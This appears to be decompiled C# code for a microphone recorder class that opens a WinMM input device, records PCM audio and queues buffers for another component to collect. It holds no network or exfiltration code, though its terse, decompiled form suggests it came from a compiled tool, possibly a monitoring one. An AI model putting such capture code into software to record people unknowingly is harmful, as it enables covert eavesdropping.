using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using WinMM;

namespace Mic
{
	// Token: 0x02000003 RID: 3
	public class Mrecorder
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000010 RID: 16 RVA: 0x000029D8 File Offset: 0x00000BD8
		// (set) Token: 0x06000011 RID: 17 RVA: 0x000029E0 File Offset: 0x00000BE0
		public virtual WaveIn a
		{
			get
			{
				return this._a;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler<DataReadyEventArgs> eventHandler = new EventHandler<DataReadyEventArgs>(this.a_DataReady);
				if (this._a != null)
				{
					this._a.DataReady -= eventHandler;
				}
				this._a = value;
				if (this._a != null)
				{
					this._a.DataReady += eventHandler;
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002A34 File Offset: 0x00000C34
		public Mrecorder(int i, int bs, int Q)
		{
			this.bfrs = new List<byte[]>();
			this.IsRecord = true;
			this.Q = 0;
			this.a = new WaveIn(i);
			this.Q = Q;
			this.a.BufferQueueSize = 200;
			this.a.BufferSize = bs;
			checked
			{
				if (Q == 0)
				{
					if (this.a.SupportsFormat(WaveFormat.Pcm8Khz8BitMono))
					{
						this.a.Open(WaveFormat.Pcm8Khz8BitMono);
					}
					else
					{
						Q = 1;
						WaveIn a = this.a;
						a.BufferSize = (int)Math.Round(unchecked((double)a.BufferSize + (double)bs / 2.0));
						this.a.Open(WaveFormat.Pcm44Khz16BitMono);
					}
				}
				else if (this.a.SupportsFormat(WaveFormat.Pcm44Khz16BitMono))
				{
					this.a.Open(WaveFormat.Pcm44Khz16BitMono);
				}
				else
				{
					Q = 0;
					this.a.BufferSize = (int)Math.Round((double)bs / 2.0);
					this.a.Open(WaveFormat.Pcm8Khz8BitMono);
				}
				this.a.Start();
				this.IsRecord = true;
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002B70 File Offset: 0x00000D70
		public byte[] GETBF()
		{
			byte[] array2;
			lock (this)
			{
				if (this.bfrs.Count > 0)
				{
					byte[] array = this.bfrs[0];
					this.bfrs.RemoveAt(0);
					array2 = array;
				}
				else
				{
					array2 = null;
				}
			}
			return array2;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002BD8 File Offset: 0x00000DD8
		public void Dispose()
		{
			this.IsRecord = false;
			try
			{
				this.a.Stop();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.a.Close();
			}
			catch (Exception ex2)
			{
			}
			try
			{
				this.a.Dispose();
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002C78 File Offset: 0x00000E78
		private void a_DataReady(object sender, DataReadyEventArgs e)
		{
			lock (this)
			{
				if (this.bfrs.Count < 2)
				{
					this.bfrs.Add(e.Data);
				}
			}
		}

		// Token: 0x04000008 RID: 8
		public List<byte[]> bfrs;

		// Token: 0x04000009 RID: 9
		[AccessedThroughProperty("a")]
		private WaveIn _a;

		// Token: 0x0400000A RID: 10
		public bool IsRecord;

		// Token: 0x0400000B RID: 11
		public int Q;
	}
}
